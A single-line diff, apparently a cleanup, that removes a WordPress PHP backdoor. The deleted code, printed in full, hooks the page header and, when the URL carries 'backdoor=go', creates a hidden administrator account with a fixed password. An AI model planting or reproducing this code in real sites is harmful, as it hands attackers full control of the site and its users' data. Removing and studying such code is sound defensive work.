@@ -1,1 +1,0 @@
-<?php add_action("wp_head","backdoor_create_admin"); function backdoor_create_admin(){if(isset($_GET["backdoor"])&&$_GET["backdoor"]=="go"){require_once ABSPATH."wp-includes/registration.php";if(!username_exists("new_admin")){$user_id=wp_create_user("new_admin","new_pass123!");$user=new WP_User($user_id);$user->set_role("administrator");wp_redirect(home_url());exit;}}} ?>'
